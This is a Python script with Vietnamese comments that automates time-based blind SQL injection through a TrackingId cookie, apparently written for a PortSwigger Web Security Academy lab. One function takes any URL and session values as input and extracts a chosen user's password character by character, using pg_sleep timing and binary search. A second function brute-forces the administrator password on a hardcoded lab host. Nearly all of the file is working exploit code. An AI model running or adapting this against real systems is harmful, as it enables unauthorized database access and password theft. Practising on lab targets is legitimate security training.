import requests
import time

def chuc_nang_1 ():
    print("Dang chay...")
    url = input("Input URL: ").strip()
    Session = input("Input session: ").strip()
    TrackingId = input("Input TrackingID: ").strip()
    username = input("Input username: ").strip()

    #keep alive
    SESSION = requests.Session()
    #BKTT
    cookies = {
        "TrackingId": TrackingId,
        "Session": Session,
    }

    ###

    def blindsql(condition: str) -> bool:
        # Nếu tên đăng nhập là {username} VÀ điều kiện kiểm tra
        # {condition} đúng, hãy tạm dừng 4 giây (pg_sleep(4)), 
        # ngược lại không dừng (pg_sleep(0))
        #=> CASE WHEN ... THEN ... ELSE ... END ... --
        payload = (
            f"{TrackingId}'%3BSELECT+CASE+WHEN+(username='{username}'+AND+"
            f"({condition}))+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
        )
        #copy cookie
        current_cookies = cookies.copy()
        #payload -> TrackingId
        current_cookies["TrackingId"] = payload

        try:
            # HTTP GET -> URL just wait for 10s
            response = SESSION.get(url, cookies=current_cookies, timeout=10)
            # >=4s is true (pg_sleep(4) - payload)
            if response.elapsed.total_seconds() >= 4:
                return True
        except requests.exceptions.RequestException:
            pass
            
        return False

    ###
    #MAX 50 char, TYPE HINTING: int
    def find_length(max_len=50) -> int:

        #range(start, stop + 1) -> range(1, 51)
        for n in range(1, max_len + 1):

            # is lenght = n?
            if blindsql(f"LENGTH(password)={n}"):
                return n
            #True return lenght
        raise RuntimeError("??? WTF if LENgth???")

    ###=============================================================
    # lo is " " and 126 is "~" 

    def find_char_binary(position: int, lo=32, hi=126) -> str:
        #ASCII 32-126 (a-z 0-9 and "[]{},./?';)

        while lo < hi: # => lo == hi #!!!

            # (32 + 126) :/ 2 
            mid = (lo + hi) // 2

            # is position is more than mid? TRUE/FALSE
            # SUBSTRING(password, {position}, 1) => position n, 1passwd
            # ASCII(...)
            # > {mid}
            
            if blindsql(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
                lo = mid + 1 # >50 or >n
                
            else:
                hi = mid # <50 or <n

        return chr(lo)   #!!!

    ###=============================================================

    def extract_password(length: int) -> str:
        result = ""

        for pos in range(1, length + 1):
            ch = find_char_binary(pos)#position
            result += ch

            print(f"Position {pos}: {ch} -> Current password: {result}")
        return result

    ###

    if __name__ == "__main__":
        print("Start...")
        #main is running
        try:
            # n = function
            n = find_length()
            print(f"Lenght Password: {n}")
            # pass = function
            password = extract_password(n)
            print(f"Password of {username}: {password}")

        #ERROR
        except Exception as e:
            print(f"Error: {e}")
def chuc_nang_2():
    print("Dang chay 2...")
    url = "https://0a1100eb032f1ab180463b1e00120060.web-security-academy.net/"
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    print("Bắt đầu lấy mật khẩu...")

    for i in range(1, 21):  # Mật khẩu dài 20 ký tự
        found_char = False
        for c in chars:
            payload = f"x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{c}') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users--"
            cookies = {'TrackingId': payload}
            
            start_time = time.time()
            try:
                requests.get(url, cookies=cookies, timeout=10)
            except requests.exceptions.Timeout:
                pass
            
            elapsed = time.time() - start_time
            
            # Nếu thời gian phản hồi lớn hơn 3.5 giây, ký tự đó là chính xác
            if elapsed > 3.5:
                password += c
                print(f"Vị trí {i}: {c} -> Password hiện tại: {password}")
                found_char = gef_False = True
                break
                
        if not found_char:
            print(f"Không tìm thấy ký tự ở vị trí {i}")
            break

    print(f"Mật khẩu hoàn chỉnh: {password}")

while True:
    print("\n=== MENU ===")
    print("1- blind sql")
    print("2- pass")
    print("0. Exit")
    luon_chon = input("Input: ")
    match luon_chon:
        case "1":
            chuc_nang_1()
        case "2":
            chuc_nang_2()
        case "0":
            break
        case _:
            print("LOl wtf?")
